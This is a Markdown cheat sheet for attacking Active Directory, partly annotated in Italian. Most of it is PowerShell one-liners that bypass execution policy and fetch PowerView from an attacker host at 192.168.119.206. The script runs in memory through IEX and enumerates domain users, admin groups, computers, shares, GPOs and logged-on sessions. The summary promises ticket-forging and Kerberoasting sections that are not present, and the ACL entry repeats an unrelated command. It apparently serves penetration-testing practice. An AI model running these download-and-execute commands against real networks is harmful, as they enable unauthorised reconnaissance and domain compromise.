# Active-Directory-Cheat-Sheet

## Summary
- Bypass Execution Policy

- Enumeration via PowerView

- Pass the Ticket
	- Access as a user to the domain required

- Kerberoasting
	- Access as any user required

- AS-REP Roasting
	- Access as any user required

- Golden Ticket
	- Full domain compromise (domain admin) required 

- Silver Ticket
	- Service hash required 

- Skeleton Key
	- Full domain compromise (domain admin) required

- Bruteforce with kerbrute

## Bypass Execution Policy
```
	- powershell -ep bypass -c "command"
	- powershell -c "command"
	- powershell -encodedcommand
	- $env:PSExecutionPolicyPreference="bypass"
	
```

## Enumeration via Powerview

### PowerView:
- Domain/USER Enumeration
```
	- hostname (vedo il mio name del computer nel dominio)
	- powershell -ep bypass -c "IEX (New-Object System.Net.WebClient).DownloadString('http://192.168.119.206/PowerView.ps1'); Get-Domain"
	- powershell -ep bypass -c "IEX (New-Object System.Net.WebClient).DownloadString('http://192.168.119.206/PowerView.ps1'); Get-DomainSID"
	- powershell -ep bypass -c "IEX (New-Object System.Net.WebClient).DownloadString('http://192.168.119.206/PowerView.ps1'); Get-DomainPolicy"
	- powershell -ep bypass -c "IEX (New-Object System.Net.WebClient).DownloadString('http://192.168.119.206/PowerView.ps1'); Get-DomainUser"
	- powershell -ep bypass -c "IEX (New-Object System.Net.WebClient).DownloadString('http://192.168.119.206/PowerView.ps1'); Get-DomainUser -SPN"
	- powershell -ep bypass -c "IEX (New-Object System.Net.WebClient).DownloadString('http://192.168.119.206/PowerView.ps1'); Get-DomainUser -Properties samaccountname,memberof"
	- powershell -ep bypass -c "IEX (New-Object System.Net.WebClient).DownloadString('http://192.168.119.206/PowerView.ps1'); Get-DomainUser -Properties samaccountname,description"
	- powershell -ep bypass -c "[System.Net.Dns]::GetHostAddresses('xor-app23')" (converte hostname in IP)
```

- Domain Controller
```
	- powershell -ep bypass -c "IEX (New-Object System.Net.WebClient).DownloadString('http://192.168.119.206/PowerView.ps1'); Get-NetDomainController"
	- powershell -ep bypass -c "IEX (New-Object System.Net.WebClient).DownloadString('http://192.168.119.206/PowerView.ps1'); Get-NetDomainController -Domain [another domain]"
```

- GROUP Enumeration
```
	- powershell -ep bypass -c "IEX (New-Object System.Net.WebClient).DownloadString('http://192.168.119.206/PowerView.ps1'); Get-DomainGroup -Name 'Domain Admins'"
	- powershell -ep bypass -c "IEX (New-Object System.Net.WebClient).DownloadString('http://192.168.119.206/PowerView.ps1');  Get-DomainGroup | where Name -like "*Admin*" | select SamAccountName "
	- powershell -ep bypass -c "IEX (New-Object System.Net.WebClient).DownloadString('http://192.168.119.206/PowerView.ps1'); Get-DomainGroupMember -Name 'Domain admins' "
	- powershell -ep bypass -c "IEX (New-Object System.Net.WebClient).DownloadString('http://192.168.119.206/PowerView.ps1'); Get-DomainGroup -Domain 'xor.com'"
	- powershell -ep bypass -c "IEX (New-Object System.Net.WebClient).DownloadString('http://192.168.119.206/PowerView.ps1'); Get-DomainGroupMember -Identity "Domain admins" -Recurse | findstr MemberName"
	- powershell -ep bypass -c "IEX (New-Object System.Net.WebClient).DownloadString('http://192.168.119.206/PowerView.ps1'); Get-DomainGroup -UserName 'HUA10157' | findstr cn"
```

- COMPUTER Enumeration
```
	- powershell -ep bypass -c "IEX (New-Object System.Net.WebClient).DownloadString('http://192.168.119.206/PowerView.ps1'); Get-NetComputer | select 	samaccountname, operatingsystem"
	- powershell -ep bypass -c "IEX (New-Object System.Net.WebClient).DownloadString('http://192.168.119.206/PowerView.ps1'); Get-DomainComputer -Ping "
```

- Local Group in the machine 
```
	- hostname
	- powershell -ep bypass -c "IEX (New-Object System.Net.WebClient).DownloadString('http://192.168.119.206/PowerView.ps1');  Get-NetLocalGroup -ComputerName PWVRTJS14.socrome.local"
```

- Logged on the computer 
```
	- powershell -ep bypass -c "IEX (New-Object System.Net.WebClient).DownloadString('http://192.168.119.206/PowerView.ps1');  Get-NetLoggedon -ComputerName PWVRTJS14.socrome.local"
	- powershell -ep bypass -c "IEX (New-Object System.Net.WebClient).DownloadString('http://192.168.119.206/PowerView.ps1');  Get-LastLoggedOn -ComputerName PWVRTJS14.socrome.local"
```

- SHARED INFO Enumeration
```
	- powershell -ep bypass -c "IEX (New-Object System.Net.WebClient).DownloadString('http://192.168.119.206/PowerView.ps1'); Find-DomainShare -Verbose"
	- cd \\fileshare.pentesting.local\FileShare
	- powershell -ep bypass -c "IEX (New-Object System.Net.WebClient).DownloadString('http://192.168.119.206/PowerView.ps1'); Invoke-ShareFinder -Verbose"
```

- GPO Enumeration
```
	- powershell -ep bypass -c "IEX (New-Object System.Net.WebClient).DownloadString('http://192.168.119.206/PowerView.ps1'); Get-NetGPO"
	- powershell -ep bypass -c "IEX (New-Object System.Net.WebClient).DownloadString('http://192.168.119.206/PowerView.ps1'); Get-NetGPO -ComputerName PWVRTJS14.socrome.local"
	
```

- OU Enumeration
```
	- powershell -ep bypass -c "IEX (New-Object System.Net.WebClient).DownloadString('http://192.168.119.206/PowerView.ps1'); Get-DomainOU"
```

- ACL (Lista di ACE (corrisponde ad un unico permesso/accesso) Due tipi: DACL(Identifica gruppi/user che hanno o accesso al servizio) e SACL(Controlla gli accessi (EDR))
```
	- powershell -ep bypass -c "IEX (New-Object System.Net.WebClient).DownloadString('http://192.168.119.206/PowerView.ps1'); Get-DomainOU"
```
